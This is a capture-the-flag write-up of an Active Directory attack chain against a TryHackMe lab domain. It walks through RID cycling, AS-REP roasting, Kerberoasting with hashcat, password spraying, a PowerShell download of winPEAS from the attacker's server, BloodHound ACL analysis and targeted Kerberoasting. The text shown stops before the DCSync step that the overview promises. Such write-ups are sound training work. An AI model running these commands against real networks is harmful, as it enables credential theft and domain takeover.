# Operation Endgame - TryHackMe

## Overview

This writeup documents a full Active Directory penetration test chain against a TryHackMe lab box (domain thm.local), going from initial unauthenticated recon all the way to a DCSync-based full domain compromise. The path involved username enumeration, Kerberos attacks (AS-REP Roasting, Kerberoasting, Targeted Kerberoasting), password reuse via spraying, BloodHound-driven ACL abuse, and a classic "plaintext credentials in an automation script" finding, leading to full domain takeover.

<img width="1200" height="1200" alt="operation-endgame-cover" src="https://github.com/user-attachments/assets/e5199de7-985e-4902-8d54-e85f2204b838" />


## Recon
```bash
nmap -sVC <machine-ip> -p- -v -T4 
```
An nmap full port/service scan revealed a standard Domain Controller footprint:

Host: Windows (Build 17763) · Domain: thm.local · Server: AD

Open ports / services
| Port        | Service      | Notes                                                    |
|-------------|--------------|----------------------------------------------------------|
| 53          | domain       | Simple DNS Plus                                          |
| 80          | http         | Microsoft IIS 10.0 — GET only (no other methods)         |
| 88          | kerberos-sec | Windows Kerberos                                         |
| 135         | msrpc        |                                                          |
| 139         | netbios-ssn  |                                                          |
| 389         | ldap         | AD LDAP                                                  |
| 443         | ssl/https    | ad.thm.local cert (self-signed, valid 2026-10 → 2027-04) |
| 445         | microsoft-ds |                                                          |
| 464         | kpasswd5     |                                                          |
| 593         | ncacn_http   | RPC over HTTP 1.0                                        |
| 636         | tcpwrapped   | (likely LDAPS)                                           |
| 9389        | mc-nmf       | .NET Message Framing                                     |
| 47001       | http         | SSDP/UPnP HTTPAPI                                        |
| 49664–49716 | msrpc        | multiple RPC endpoints including NCACN_HTTP              |

This confirmed a single DC environment with LDAP, Kerberos, SMB, and RDP all reachable — a wide attack surface to start from.

Looking at port 80, it just displayed the IIS default page. This port offered no immediate attack surface beyond IIS fingerprinting.
<img width="1042" height="733" alt="port80" src="https://github.com/user-attachments/assets/852e6eee-547d-4b68-a36a-920d38d7f558" />

The scan confirms that it is DC machine, hence I proceeded to add the DC IP in `/etc/hosts` file.
<img width="476" height="33" alt="adding-host" src="https://github.com/user-attachments/assets/08a7580c-060f-4b89-ad94-6ef1cc54a022" />

## Enumeration
### SMB enumeration
I proceeded to perform **SMB enumeration** as the guest user, using netexec tool.
```bash
nxc smb AD.thm.local -u 'guest' -p '' --shares
```
<img width="968" height="547" alt="smb-enum" src="https://github.com/user-attachments/assets/f280b951-01b5-4b74-a281-5b775283907e" />
Null SMB session confirmed, with IPC$ readable and the standard ADMIN$, C$, NETLOGON, and SYSVOL shares visible — all expected for a DC, no immediately readable loot on SYSVOL/NETLOGON this pass.

### RID cycling
I then thought of **RID cycling** over `IPC$` for username enumeration.

```bash
nxc smb AD.thm.local -u 'guest' -p '' --rid >> rid_brute.txt
```
<img width="980" height="666" alt="rid-cycling" src="https://github.com/user-attachments/assets/f4c33789-3d68-4773-92cc-b290de9a62fe" />

So now we got a list of around 492 users, all enumerated using RID cycling. You would need to filter out the piped text file, to keep just the usernames. Here's the python script I used:
```python
import re

line_re = re.compile(r'^\S+\s+\S+\s+\S+\s+\S+\s+\d+:\s+[^\s]+\\(.+) \(([^)]+)\)$')

users = []
with open('rid_brute.txt', 'r') as f:
    for line in f:
        line = line.strip()
        m = line_re.match(line)
        if m and m.group(2) == 'SidTypeUser':
            users.append(m.group(1).strip())

with open('rid_brute_users.txt', 'w') as f:
    for u in users:
        f.write(u + '\n')

print(f"Extracted {len(users)} users")
```
Alternatively, we can also try **anonymous LDAP** over null sessions, for enumerating users, which I think was a better approach to remove reduce filtering difficulty.
```bash
nxc ldap AD.thm.local -u 'guest' -p '' --users
```
## Initial Access
### AS-REP roasting
After we got a list of users, it was finally time to perform **AS-REP roasting**. Now, the AS-REP roasting was tried against the list of usernames we got.
```bash
nxc ldap AD.thm.local -u <username-list> -p '' --asreproast
```
pipe the output in a file (e.g. asrep_hashes.txt)
<img width="982" height="637" alt="asrep-roasting" src="https://github.com/user-attachments/assets/66135c6c-dfe9-457f-bfe1-4b4bd0565b66" />
Now we got a list of hashes of accounts with **Do not require Kerberos pre-authentication** enabled which are crackable offline. Using hashcat or jhon, we can try to crack these hashes.
```bash
hashcat -a 0 -m 18200 users.txt /path/to/wordlist.txt
```
The **rockyou.txt** wordlist failed to crack the hashes
<img width="977" height="612" alt="rockyou-failed" src="https://github.com/user-attachments/assets/31f04d54-d1c3-47d4-9a1f-c3b73d4fbaab" />
So now I proceeded to use another wordlist -> **xato-net-10-million-passwords.txt**
<img width="1022" height="463" alt="xato-10mill-failed" src="https://github.com/user-attachments/assets/dbc3f4f2-115d-45dc-ae17-bdcc0b0f2c16" />
And as expected, I was unable to crack them...

### Kerberoasting
After unsuccessful AS-REP roast, I proceeded to **kerberoast** using guest account. Normally, you would require a valid domain account credentials and list of SPNs, except when Kerberos pre-authentication is not required. With the same list of users, I performed kerberoasting.
```bash
nxc ldap AD.thm.local -u 'guest' -p '' -kerberoasting
```
<img width="960" height="602" alt="kerberoast" src="https://github.com/user-attachments/assets/b56625cc-cbb3-4cfd-9954-f299c1fab50f" />

Got the **TGS** hash of **CODY_ROY** account. Now I proceed to hashcracking.
```bash
hashcat -a 0 -m 13100 <TGS-hash> /path/to/wordlist.txt
```
<img width="883" height="559" alt="kb_hash_cracked" src="https://github.com/user-attachments/assets/9600be2e-cd79-4d61-9f94-ebf26b3e3c1f" />

Finally using the **rockyou.txt** wordlist, we were able to crack the hash and obtain the account password for **CODY_ROY**.
We can now confirm these credentials by authenticating to SMB using DC
```bash
nxc smb AD.thm.local -u 'CODY_ROY' -p 'REDACTED' --shares
```

### Access as CODY_ROY
```bash
xfreerdp3 /v:<machine-ip> /u:CODY_ROY /p:REDACTED
```
I then used **RDP** to enumerate as CODY_ROY, but the environment was restricted. Hence, I figured out to use `Win + R` to open cmd prompt.
<img width="1523" height="861" alt="codyroy_rdp" src="https://github.com/user-attachments/assets/7930caeb-4953-451e-a542-3e84b72416ec" />
I did manual enumeration work but didn't have any luck, so I decided to get **WinPEAS.exe** onto the target machine. So I created a python server on my host machine
```bash
python3 -m http.server
```
and decided to get winPEAS.exe onto target machine using this **PowerShell** command
```PowerShell
Invoke-WebRequest -Uri "http://<attackbox-ip:port>/winPEAs.exe" -OutFile "C:\Users\Public\Downloads\winPEAS.exe"
```
But the target machine is guarded by Windows Defender, and Windows Defender just blocked the execution.
<img width="958" height="450" alt="winpeas-failed" src="https://github.com/user-attachments/assets/df4a243d-f9ee-4678-beec-771cface33c6" />
I could've tried getting winPEAS.ps1 instead, but then the process would've become more tedious, hence why I decided to go for Bloodhound collection.

### Password spraying
With **CODY_ROY** account password in hand, I decided to use **password spraying** using netexec, to check if more accounts have the same password. 
```bash
nxc smb AD.thm.local -u users.txt -p 'REDACTED' --continue-on-success
```
<img width="1045" height="44" alt="password-spraying" src="https://github.com/user-attachments/assets/464337cb-c2e6-4cb5-8096-6a37d4071376" />

Through password spraying we were able to get another account **ZACHARY_HUNT** with the same password. Now we can gain access to **ZACHARY_HUNT** account.

### Access as ZACHARY_HUNT
With the new credentials, I decided to RDP.
```bash
xfreerdp3 /v:<machine-ip> /u:ZACHARY_HUNT /p:REDACTED
```
Once again, while performing enumeration, I couldn't find any clues that would lead to next target or the flag itself. Now I proceeded to Bloodhound collection.

## Pivoting
### Bloodhound collection
```bash
bloodhound-python -u CODY_ROY -p '<password>' -d thm.local -ns <DC_IP> -c All
```
I used Bloodhound python collector for this machine, since it is quick and efficient, and it will automatically save loot in a zip file.
<img width="345" height="32" alt="loot-collect" src="https://github.com/user-attachments/assets/ed738229-72c1-427a-9268-6d4e269e67ae" />

BloodHound collection output zip Collection completed, producing a timestamped bloodhound.zip ready to ingest into BloodHound CE.

### Bloodhound Analysis
**ZACHARY_HUNT** BloodHound graph **ZACHARY_HUNT** holds no privileged group membership on his own, but his Outbound Object Control (13 edges) includes a direct `GenericWrite` onto **JERRI_LANCASTER**, plus broader `GenericWrite` reach inherited through the `EVERYONE` group over a dozen other accounts.
<img width="1604" height="872" alt="zachary_hunt_graph" src="https://github.com/user-attachments/assets/6115e3ef-7adc-4bab-a0d3-6791b549dddd" />
It was obvious who our next target was.

### Targeted Kerberoasting
**JERRI_LANCASTER** holds a `WriteOwner` edge onto the custom `READER ADMINS` group — meaning whoever controls Jerri's account can take ownership of that group, rewrite its ACL, and add themselves (or anyone) as a member. Given a group named "Reader Admins" in an AD lab, this is a strong signal it carries replication (DCSync) rights.
<img width="1638" height="931" alt="jerri_lancaster_graph" src="https://github.com/user-attachments/assets/21b8a910-41b9-42ec-83e2-89ffae4dd4e7" />

Since, **ZACHARY_HUNT** has `GenericWrite` permission over **JERRI_LANCASTER**, we can try to perform **Targeted Kerberoasting**.

```bash
python3 targetedKerberoast.py -d 'thm.local' -u 'ZACHARY_HUNT' -p 'REDACTED' --request-user 'JERRI_LANCASTER' --dc-ip <dc-ip>
```
<img width="910" height="257" alt="jerri_targeted_kerberoast" src="https://github.com/user-attachments/assets/77a19893-db13-4af6-bb47-0f9f5200613f" />

Targeted Kerberoast against **JERRI_LANCASTER** A valid $krb5tgs$23$ ticket hash was returned directly — the SPN write, ticket request, and (implicit) cleanup all happened in one shot via the `GenericWrite` right.







